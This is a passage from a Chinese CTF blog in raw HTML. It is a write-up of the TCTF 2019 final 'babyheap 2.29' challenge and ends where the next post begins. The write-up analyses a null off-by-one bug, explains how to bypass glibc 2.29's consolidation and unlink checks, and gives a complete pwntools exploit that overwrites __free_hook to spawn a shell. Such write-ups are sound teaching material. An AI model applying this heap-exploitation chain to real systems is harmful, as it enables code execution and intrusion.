<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">RELRO:</span>    Full RELRO</span><br><span class="line"><span class="symbol">Stack:</span>    Canary found</span><br><span class="line"><span class="symbol">NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">PIE:</span>      PIE enabled</span><br></pre></td></tr></table></figure>
<p>&#x5F00;&#x542F;&#x4E86;&#x5168;&#x4FDD;&#x62A4;&#x3002;</p>
<p>&#x518D;&#x770B;&#x4E0B;&#x7A0B;&#x5E8F;&#x7684;&#x529F;&#x80FD;&#xFF1A;</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    __ __ _____________   __   __    ___    ____</span><br><span class="line">   <span class="regexp">/ /</span><span class="regexp">/_/</span><span class="regexp">/ ____/</span> ____<span class="regexp">/ | /</span> <span class="regexp">/  /</span> <span class="regexp">/   /</span>   |  / __ )</span><br><span class="line">  <span class="regexp">/ ,&lt;  /</span> __<span class="regexp">/ /</span> __<span class="regexp">/ /</span>  |<span class="regexp">/ /</span>  <span class="regexp">/ /</span>   <span class="regexp">/ /</span>| | / __  |</span><br><span class="line"> <span class="regexp">/ /</span>| |<span class="regexp">/ /</span>___<span class="regexp">/ /</span>___<span class="regexp">/ /</span>|  <span class="regexp">/  /</span> <span class="regexp">/___/</span> ___ |<span class="regexp">/ /</span>_<span class="regexp">/ /</span></span><br><span class="line"><span class="regexp">/_/</span> |_<span class="regexp">/_____/</span>_____<span class="regexp">/_/</span> |_<span class="regexp">/  /</span>_____<span class="regexp">/_/</span>  |_<span class="regexp">/_____/</span></span><br><span class="line"></span><br><span class="line">===== Baby Heap <span class="number">2.29</span> =====</span><br><span class="line"><span class="number">1.</span> Allocate</span><br><span class="line"><span class="number">2.</span> Update</span><br><span class="line"><span class="number">3.</span> Delete</span><br><span class="line"><span class="number">4.</span> View</span><br><span class="line"><span class="number">5.</span> Exit</span><br><span class="line"><span class="string">Command:</span></span><br></pre></td></tr></table></figure>
<p>&#x6F0F;&#x6D1E;&#x70B9;&#x5728;Update&#x529F;&#x80FD;&#xFF0C;&#x5B58;&#x5728;&#x4E00;&#x4E2A;null off by one</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">v3</span> = <span class="number">0</span>LL<span class="comment">;</span></span><br><span class="line">  <span class="meta">while</span> ( <span class="built_in">v3</span> &lt; <span class="built_in">a2</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">v4</span> = read(<span class="number">0</span>, (void *)(<span class="built_in">v3</span> + <span class="built_in">a1</span>), <span class="built_in">a2</span> - <span class="built_in">v3</span>)<span class="comment">;</span></span><br><span class="line">    <span class="meta">if</span> ( <span class="built_in">v4</span> &gt; <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">v3</span> += <span class="built_in">v4</span><span class="comment">;</span></span><br><span class="line">    }</span><br><span class="line">    <span class="meta">else</span> <span class="meta">if</span> ( *__errno_location() != <span class="number">11</span> &amp;&amp; *__errno_location() != <span class="number">4</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">break;</span></span><br><span class="line"><span class="keyword"> </span>   }</span><br><span class="line">  }</span><br><span class="line">  *(_BYTE *)(<span class="built_in">a1</span> + <span class="built_in">v3</span>) = <span class="number">0</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x4F1A;&#x901A;&#x8FC7;mmap&#x968F;&#x673A;&#x5730;&#x5740;&#x5206;&#x914D;0x1000&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x7136;&#x540E;&#x7A0B;&#x5E8F;Allocate&#x529F;&#x80FD;&#x4F1A;&#x5728;&#x8BE5;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x7684;&#x968F;&#x673A;&#x4F4D;&#x7F6E;&#x5199;&#x5165;&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x5185;&#x5BB9;&#x5982;&#x4E0B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>{</span></span><br><span class="line">  <span class="keyword">int</span> flag;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="keyword">int</span> *ptr</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;delete&#x529F;&#x80FD;&#x4F1A;&#x4E0A;&#x8FF0;&#x4E09;&#x4E2A;&#x6570;&#x636E;&#x6E05;&#x7A7A;&#x3002;</p>
<h2 id="0x01-&#x5229;&#x7528;&#x5206;&#x6790;"><a href="#0x01-&#x5229;&#x7528;&#x5206;&#x6790;" class="headerlink" title="0x01 &#x5229;&#x7528;&#x5206;&#x6790;"></a>0x01 &#x5229;&#x7528;&#x5206;&#x6790;</h2><p>&#x6240;&#x4EE5;&#x80FD;&#x591F;&#x5229;&#x7528;&#x7684;&#x70B9;&#x5C31;&#x662F;&#x90A3;&#x4E2A;null off by one&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x4F7F;&#x7528;chunk overlapping&#x65F6;&#xFF0C;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;chunk extend&#xFF0C;&#x4FEE;&#x6539;&#x4E0B;&#x4E00;&#x4E2A;chunk&#x7684;prev_size&#xFF0C;&#x63A5;&#x7740;&#x53BB;&#x89E6;&#x53D1;&#x5411;&#x540E;&#x5408;&#x5E76;&#xFF0C;&#x4F7F;&#x4E4B;&#x5408;&#x5E76;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x9020;&#x6210;chunk overlapping&#xFF1B;&#x53E6;&#x4E00;&#x4E2A;&#x662F;chunk shrink&#xFF0C;&#x4FEE;&#x6539;&#x5F53;&#x524D;free&#x72B6;&#x6001;&#x4E0B;chunk&#x7684;size&#xFF0C;&#x4F7F;malloc&#x65F6;&#xFF0C;glibc&#x4E0D;&#x80FD;&#x51C6;&#x786E;&#x5B9A;&#x4F4D;&#x4E0B;&#x4E00;&#x4E2A;chunk&#x7684;&#x4F4D;&#x7F6E;&#x6765;&#x4FEE;&#x6539;&#x5176;prev_size&#xFF0C;&#x63A5;&#x7740;&#x540C;&#x6837;&#x53BB;&#x89E6;&#x53D1;&#x5411;&#x540E;&#x5408;&#x5E76;&#xFF0C;&#x4F7F;&#x4E4B;&#x5408;&#x5E76;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x9020;&#x6210;chunk overlapping&#x3002;</p>
<p>&#x4F46;&#x662F;2.29&#x7684;libc&#x52A0;&#x5165;&#x4E86;&#x4EE5;&#x4E0B;&#x7684;&#x68C0;&#x6D4B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) {</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x5411;&#x540E;&#x5408;&#x5E76;&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x68C0;&#x6D4B;&#x5F85;&#x5408;&#x5E76;chunk&#x7684;size&#xFF0C;&#x4E0E;&#x5F53;&#x524D;chunk&#x7684;prev_size&#x662F;&#x5426;&#x76F8;&#x540C;&#xFF0C;&#x5426;&#x5219;&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x56E0;&#x6B64;&#x4E0A;&#x8FF0;&#x7684;&#x4E24;&#x79CD;&#x529E;&#x6CD5;&#x5C31;&#x4F1A;&#x5931;&#x6548;&#x3002;</p>
<h3 id="&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x5B9E;&#x73B0;libc2-29&#x4E0B;&#x7684;chunk-overlapping"><a href="#&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x5B9E;&#x73B0;libc2-29&#x4E0B;&#x7684;chunk-overlapping" class="headerlink" title="&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x5B9E;&#x73B0;libc2.29&#x4E0B;&#x7684;chunk overlapping"></a>&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x5B9E;&#x73B0;libc2.29&#x4E0B;&#x7684;chunk overlapping</h3><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5B8C;&#x5168;&#x4F2A;&#x9020;&#x5F85;&#x5408;&#x5E76;chunk&#x7684;head&#x7684;&#x6240;&#x6709;&#x4FE1;&#x606F;&#xFF0C;&#x7EFF;&#x8272;&#x90E8;&#x5206;&#x662F;&#x6211;&#x4F2A;&#x9020;&#x662F;&#x6570;&#x636E;</p>
<p><img src="/2019/06/10/2019-TCTF-final-babyheap2-29/image-20190613135826757.png" alt="image-20190613135826757"></p>
<p>&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x89E6;&#x53D1;&#x5411;&#x540E;&#x5408;&#x5E76;&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x4E0A;&#x8FF0;&#x7684;&#x68C0;&#x6D4B;&#xFF0C;&#x4F46;&#x662F;unlink&#x65F6;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x94FE;&#x8868;&#x68C0;&#x6D4B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x6784;&#x9020;fd&#x3001;bk&#xFF0C;&#x56E0;&#x6B64;&#x8FD8;&#x9700;&#x8981;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x6307;&#x5411;&#x8BE5;chunk&#x7684;&#x6307;&#x9488;(&#x9700;&#x8981;&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;)&#xFF0C;&#x6700;&#x540E;&#x6784;&#x9020;&#x6570;&#x636E;&#x5982;&#x4E0B;</p>
<p><img src="/2019/06/10/2019-TCTF-final-babyheap2-29/image-20190614094206536.png" alt="image-20190614094206536"></p>
<p>&#x5B9E;&#x9645;chunk A&#x7684;&#x5E03;&#x5C40;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x<span class="number">558216406d40</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x0000<span class="number">000000000101</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558216406d50</span>:	<span class="number">0</span>x0000<span class="number">558216406d60</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558216406d60</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x000000<span class="number">00000001e1</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558216406d70</span>:	<span class="number">0</span>x0000<span class="number">558216406d38</span>	<span class="number">0</span>x0000<span class="number">558216406d40</span></span><br></pre></td></tr></table></figure>
<p>&#x7ED5;&#x8FC7;&#x94FE;&#x8868;&#x68C0;&#x6D4B;&#xFF0C;&#x6210;&#x529F;&#x5B9E;&#x73B0;chunk overlapping</p>
<p>&#x5173;&#x4E8E;&#x6CC4;&#x9732;libc&#x5730;&#x5740;&#x548C;&#x5806;&#x5730;&#x5740;&#xFF0C;&#x56E0;&#x4E3A;&#x7A0B;&#x5E8F;&#x6709;&#x8F93;&#x51FA;&#x529F;&#x80FD;&#xFF0C;&#x5F53;chunk&#x7531;free&#x72B6;&#x6001;&#x53D8;&#x4E3A;allocate&#x72B6;&#x6001;&#x540E;&#xFF0C;&#x5176;&#x5185;&#x5B58;&#x4E0D;&#x4F1A;&#x88AB;&#x6E05;&#x7A7A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5176;&#x5305;&#x542B;libc&#x5730;&#x5740;&#x548C;&#x5806;&#x5730;&#x5740;&#x7684;fd&#x3001;bk&#x6307;&#x9488;&#x4E0D;&#x4F1A;&#x88AB;&#x6E05;&#x9664;&#xFF0C;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;</p>
<h2 id="0x02-EXP"><a href="#0x02-EXP" class="headerlink" title="0x02 EXP"></a>0x02 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&apos;./babyheap2.29&apos;</span>)</span><br><span class="line">    main_arena_off= <span class="number">0x3EBC40</span></span><br><span class="line">    <span class="comment">#malloc_hook_off = 0x3ebc30</span></span><br><span class="line">    free_hook_off = <span class="number">0x3ed8e8</span></span><br><span class="line">    <span class="comment">#one_off = 0x10a38c</span></span><br><span class="line">    system_off = <span class="number">0x4f440</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&apos;192.168.201.21&apos;</span>,<span class="number">1904</span>)</span><br><span class="line">    <span class="comment">#p = process([&apos;./lib/ld-2.29.so&apos;,&apos;--library-path&apos;,&apos;./lib&apos;,&apos;./babyheap2.29&apos;])</span></span><br><span class="line">    main_arena_off= <span class="number">0x1E4C40</span></span><br><span class="line">    <span class="comment">#malloc_hook_off = 0x1e4c30</span></span><br><span class="line">    free_hook_off = <span class="number">0x1e75a8</span></span><br><span class="line">    system_off = <span class="number">0x52fd0</span></span><br><span class="line">    <span class="comment">#one_off = 0xe237f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &apos;debug&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input(<span class="string">&apos;test&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Size: &apos;</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="comment">#p.recvuntil(&apos;Allocated&apos;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Size: &apos;</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Content: &apos;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Deleted&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;4&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_7_times</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_7_times</span><span class="params">(start,end)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start,end+<span class="number">1</span>):</span><br><span class="line">        dele(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    add_7_times(<span class="number">0x80</span>)<span class="comment">#0-6</span></span><br><span class="line">    dele_7_times(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    add_7_times(<span class="number">0xf0</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0xf8</span>) <span class="comment">#7 chunkA</span></span><br><span class="line">    add(<span class="number">0xf8</span>) <span class="comment">#8 chunkB</span></span><br><span class="line">    add(<span class="number">0xf0</span>) <span class="comment">#9 chunkC</span></span><br><span class="line">    add(<span class="number">0xf0</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment">#11</span></span><br><span class="line">    edit(<span class="number">11</span>,<span class="number">8</span>,<span class="string">&apos;/bin/sh\x00&apos;</span>)</span><br><span class="line">    dele_7_times(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#malloc 7 8 9 10</span></span><br><span class="line">    dele(<span class="number">7</span>)</span><br><span class="line">    dele(<span class="number">8</span>)</span><br><span class="line">    add_7_times(<span class="number">0xf0</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0xf8</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0xf8</span>)<span class="comment">#8</span></span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;: &apos;</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))-main_arena_off<span class="number">-0x250</span></span><br><span class="line">    free_hook = libc_base + free_hook_off</span><br><span class="line">    system = libc_base+system_off</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;: &apos;</span>)</span><br><span class="line">    heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>)) - <span class="number">0xb50</span></span><br><span class="line">    log.info(<span class="string">&apos;heap_base: &apos;</span>+hex(heap_base))</span><br><span class="line">    main_arena = libc_base + main_arena_off</span><br><span class="line">    log.info(<span class="string">&apos;libc_base: &apos;</span>+hex(libc_base))</span><br><span class="line">    log.info(<span class="string">&apos;main_arena: &apos;</span>+hex(main_arena))</span><br><span class="line">    dele_7_times(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#malloc 7-11</span></span><br><span class="line">    chunkA = heap_base + <span class="number">0xd50</span></span><br><span class="line">    edit(<span class="number">7</span>,<span class="number">0x30</span>,p64(chunkA+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x1e1</span>)+p64(chunkA<span class="number">-0x18</span>)+p64(chunkA<span class="number">-0x10</span>))</span><br><span class="line">    edit(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&apos;a&apos;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x1e0</span>))</span><br><span class="line">  </span><br><span class="line">    dele(<span class="number">9</span>)</span><br><span class="line">    add_7_times(<span class="number">0xf0</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0xd0</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0xf0</span>)<span class="comment">#12</span></span><br><span class="line">    dele(<span class="number">12</span>) </span><br><span class="line">    edit(<span class="number">8</span>,<span class="number">16</span>,p64(free_hook)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0xf0</span>)<span class="comment">#12</span></span><br><span class="line">    add(<span class="number">0xf0</span>)<span class="comment">#13</span></span><br><span class="line">    edit(<span class="number">13</span>,<span class="number">8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;11&apos;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/27/2018-0CTF-heapstorm2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/27/2018-0CTF-heapstorm2/" itemprop="url">2018-0CTF-heapstorm2</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-27T18:02:03+08:00">
                2019-05-27
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/05/27/2018-0CTF-heapstorm2/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/05/27/2018-0CTF-heapstorm2/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/05/27/2018-0CTF-heapstorm2/" class="leancloud_visitors" data-flag-title="2018-0CTF-heapstorm2">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc<span class="number">-2.24</span>.so</span><br><span class="line"><span class="symbol">Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">RELRO:</span>    Full RELRO</span><br><span class="line"><span class="symbol">Stack:</span>    Canary found</span><br><span class="line"><span class="symbol">NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">PIE:</span>      PIE enabled</span><br></pre></td></tr></table></figure>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    __ __ _____________   __   __    ___    ____</span><br><span class="line">   <span class="regexp">/ /</span><span class="regexp">/_/</span><span class="regexp">/ ____/</span> ____<span class="regexp">/ | /</span> <span class="regexp">/  /</span> <span class="regexp">/   /</span>   |  / __ )</span><br><span class="line">  <span class="regexp">/ ,&lt;  /</span> __<span class="regexp">/ /</span> __<span class="regexp">/ /</span>  |<span class="regexp">/ /</span>  <span class="regexp">/ /</span>   <span class="regexp">/ /</span>| | / __  |</span><br><span class="line"> <span class="regexp">/ /</span>| |<span class="regexp">/ /</span>___<span class="regexp">/ /</span>___<span class="regexp">/ /</span>|  <span class="regexp">/  /</span> <span class="regexp">/___/</span> ___ |<span 